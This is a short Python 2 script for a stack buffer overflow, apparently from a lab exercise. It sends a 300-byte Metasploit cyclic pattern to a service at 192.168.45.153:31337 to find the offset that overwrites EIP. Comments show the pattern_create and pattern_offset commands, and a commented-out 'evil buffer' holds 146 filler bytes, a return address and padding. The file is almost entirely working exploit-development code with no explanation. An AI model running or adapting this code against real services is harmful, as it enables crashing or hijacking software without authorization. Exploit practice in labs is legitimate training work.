import socket

# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300

pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#buffer = 'A' * 146 + b"\xC3\x14\x04\x08" + 'C' * 400
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.45.153', 31337))
    s.send(pattern + '\r\n\r\n')
    print s.recv(1024)
    print "\nDone!."
except:
	print "Could not connect"

#$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l STRING_LENGTH(300) -q EIP_VALUE(37694236)